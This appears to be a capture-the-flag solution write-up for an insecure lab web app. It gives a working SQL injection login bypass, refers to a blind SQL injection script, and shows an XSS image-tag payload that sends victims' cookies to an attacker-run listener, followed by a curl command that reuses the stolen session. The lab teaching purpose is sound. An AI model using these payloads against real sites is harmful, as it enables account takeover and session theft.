# Silk Road at Home Solution

The goal of this challenge is to exploit an insecure web application three different ways:

1. SQL injection
2. blind SQL injection
3. cross-site scripting

The first task is straightforward. The login screen is susceptible to an SQL injection attack:

    a' or 1=1 limit 6, 29; -- 
    (note ending space after --, and password must be not empty)

The above command could be simplified to "a' or 1=1; -- " but this will always log the user in to the first account in the database.  The admin user is further down to increase the difficulty of this challenge. By using the limit command, the participant should be able to work down the user table to find admin. Since it is only in row six, it should not take too long to find.

The second task is much more difficult. A blind SQL injection attack is used to recover a password from the database. The script blind.py is included and accomplishes this task. The password will be printed one character per line.

The final task is to determine who else is logged in. The question implies that another user is active. The active user can be discovered using cross-site scripting. There are two parts. First, the participant must run a service that listens for HTTP connections that will carry the session payload. This is done with app.py. Copy app.py to the Kali machine, then in the same directory run "flask run --host=0.0.0.0" (without quotes). This will launch a minimalist web service to listen for cross-site scripting data exfiltration.

Next, post javascript to the web app. This is done in the post listing page. The word "script" has been filtered out, so simple `<script>` tags will not work. There are many approaches, but mine has been to post the following string:

    <img src="none" onerror="this.src='http://192.168.1.101:5000/monster?c=' + document.cookie;" /> 

When the victim browses to the listing, his cookie will be sent to the attacker's service. With the cookie string, a simple curl command will reveal the logged in user's name in plain text html:

    curl -v --cookie "session=blahblahblahblahblah" http://192.168.1.100/ 

NOTE: The above XSS strategy works, but in order for the victim to connect to the running service, I have found that I must first browse to the XSS listing first. Once my Kali browser has contacted the flask service, the victim attack will succeed. I have not figured out why this is the case yet, and other approaches will likely not require this extra step.
